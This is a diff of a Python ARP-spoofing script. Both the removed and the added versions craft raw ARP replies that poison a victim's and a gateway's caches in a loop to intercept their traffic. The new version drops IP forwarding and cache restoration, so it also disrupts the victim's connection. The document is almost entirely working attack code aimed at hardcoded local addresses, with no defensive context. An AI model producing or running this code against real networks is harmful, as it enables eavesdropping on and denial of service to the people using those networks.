@@ -1,124 +1,96 @@
-import os
-import subprocess
-import struct
 import socket
-import time
-
-
-def enable_ip_forwarding():
-    """Enable IP forwarding on Linux."""
-    try:
-        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-            f.write("1")
-        print("[*] IP forwarding enabled.")
-    except Exception as e:
-        print(f"[!] Failed to enable IP forwarding: {e}")
-
-
-def disable_ip_forwarding():
-    """Disable IP forwarding on Linux."""
-    try:
-        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
-            f.write("0")
-        print("[*] IP forwarding disabled.")
-    except Exception as e:
-        print(f"[!] Failed to disable IP forwarding: {e}")
-
-
-def create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac):
-    """Create an ARP reply packet."""
-    hardware_type = 1  # Ethernet
-    protocol_type = 0x0800  # IPv4
-    hardware_size = 6  # MAC address length
-    protocol_size = 4  # IP address length
-    opcode = 2  # ARP reply
-
-    # Construct the ARP reply
-    arp_reply = struct.pack(
-        "!HHBBH6s4s6s4s",
-        hardware_type,
-        protocol_type,
-        hardware_size,
-        protocol_size,
-        opcode,
-        bytes.fromhex(spoof_mac.replace(":", "")),  # Sender MAC
-        socket.inet_aton(spoof_ip),  # Sender IP
-        bytes.fromhex(target_mac.replace(":", "")),  # Target MAC
-        socket.inet_aton(target_ip),  # Target IP
-    )
-    return arp_reply
-
-
-def send_arp_spoof(iface, target_ip, target_mac, spoof_ip, spoof_mac):
-    """Send crafted ARP replies to the target."""
-    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
-                         socket.htons(0x0806))
-    sock.bind((iface, 0))
-
-    arp_packet = create_arp_reply(target_ip, target_mac, spoof_ip, spoof_mac)
-    sock.send(arp_packet)
-    print(
-        f"[*] ARP spoof sent to {target_ip} ({target_mac}) claiming to be {spoof_ip}")
-
+import struct
+import binascii
+from time import sleep
+import subprocess
 
 def get_mac(ip):
-    """Get the MAC address of a given IP."""
-    output = subprocess.check_output(["arp", "-n"], encoding="utf-8")
-    for line in output.splitlines():
-        if ip in line:
-            return line.split()[2]
+    """
+    Retrieves the MAC address corresponding to the given IP address using the `arp` command.
+    """
+    try:
+        output = subprocess.check_output(["arp", "-n", ip], encoding="utf-8")
+        for line in output.splitlines():
+            if ip in line:
+                return line.split()[2]
+    except Exception as e:
+        print(f"Failed to get MAC address for {ip}: {e}")
     return None
 
+def create_arp_packet(src_mac, src_ip, target_mac, target_ip, operation=2):
+    """
+    Creates an ARP packet.
+    """
+    type_hardware = 1
+    type_protocol = 0x0800
+    len_hardware = 6
+    len_protocol = 4
 
-def main():
-    """Main function to perform ARP spoofing."""
-    iface = "eth0"  # Change to your network interface
-    victim_ip = "192.168.240.124"  # Victim's IP
-    gateway_ip = "192.168.240.26"  # Gateway's IP
+    # Ethernet frame
+    ethernet_frame = struct.pack(
+        "!6s6sH",
+        binascii.unhexlify(target_mac.replace(":", "")),
+        binascii.unhexlify(src_mac.replace(":", "")),
+        0x0806
+    )
 
-    # Get MAC addresses
-    victim_mac = get_mac(victim_ip)
-    gateway_mac = get_mac(gateway_ip)
+    # ARP header
+    arp_header = struct.pack(
+        "!HHBBH6s4s6s4s",
+        type_hardware,               # Hardware type (Ethernet)
+        type_protocol,               # Protocol type (IPv4)
+        len_hardware,                # Hardware address length
+        len_protocol,                # Protocol address length
+        operation,                   # ARP operation (2 for reply)
+        binascii.unhexlify(src_mac.replace(":", "")),  # Sender MAC
+        socket.inet_aton(src_ip),    # Sender IP
+        binascii.unhexlify(target_mac.replace(":", "")),  # Target MAC
+        socket.inet_aton(target_ip)  # Target IP
+    )
 
-    if not victim_mac or not gateway_mac:
-        print("[!] Failed to get MAC addresses. Ensure the targets are reachable.")
+    return ethernet_frame + arp_header
+
+def perform_arp_spoof(victim_ip, iface="eth0"):
+    """
+    Performs ARP spoofing against the specified victim IP.
+    """
+    # Get local MAC address
+    raw = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0806))
+    raw.bind((iface, socket.htons(0x0806)))
+
+    local_mac = get_mac(socket.gethostbyname(socket.gethostname()))
+    if not local_mac:
+        print("[!] Failed to retrieve local MAC address.")
         return
 
-    print(f"[*] Victim MAC: {victim_mac}")
-    print(f"[*] Gateway MAC: {gateway_mac}")
+    # Get victim MAC address
+    victim_mac = get_mac(victim_ip)
+    if not victim_mac:
+        print(f"[!] Failed to retrieve victim MAC address for {victim_ip}.")
+        return
 
-    # Get attacker's MAC address
-    attacker_mac = "08:00:27:ad:25:87"
-    # get_mac(None)
-    attacker_ip = socket.gethostbyname(socket.gethostname())
+    # Get router IP and MAC address
+    router_ip = subprocess.check_output(["ip", "route"], encoding="utf-8").split("default via ")[1].split()[0]
+    router_mac = get_mac(router_ip)
+    if not router_mac:
+        print(f"[!] Failed to retrieve router MAC address for {router_ip}.")
+        return
 
-    print(f"[*] Attacker IP: {attacker_ip}")
-    print(f"[*] Attacker MAC: {attacker_mac}")
+    print(f"[*] Local MAC: {local_mac}")
+    print(f"[*] Victim MAC: {victim_mac} ({victim_ip})")
+    print(f"[*] Router MAC: {router_mac} ({router_ip})")
 
-    # Enable IP forwarding
-    enable_ip_forwarding()
+    # Create ARP spoof packets
+    victim_packet = create_arp_packet(local_mac, router_ip, victim_mac, victim_ip)
+    router_packet = create_arp_packet(local_mac, victim_ip, router_mac, router_ip)
 
+    print("[*] Starting ARP spoofing...")
     try:
-        print("[*] Starting ARP spoofing...")
         while True:
-            # Spoof victim to think we're the gateway
-            send_arp_spoof(iface, victim_ip, victim_mac,
-                           gateway_ip, attacker_mac)
-
-            # Spoof gateway to think we're the victim
-            send_arp_spoof(iface, gateway_ip, gateway_mac,
-                           victim_ip, attacker_mac)
-
-            time.sleep(2)  # Repeat every 2 seconds
+            raw.send(victim_packet)
+            raw.send(router_packet)
+            sleep(2)
     except KeyboardInterrupt:
-        print("\n[!] Stopping attack and restoring network...")
-        # disable_ip_forwarding()
+        print("\n[!] Stopping ARP spoofing.")
+        raw.close()
 
-        # Send legitimate ARP replies to restore the ARP tables
-        send_arp_spoof(iface, victim_ip, victim_mac, gateway_ip, gateway_mac)
-        send_arp_spoof(iface, gateway_ip, gateway_mac, victim_ip, victim_mac)
-        print("[*] Network restored.")
-
-
-if __name__ == "__main__":
-    main()
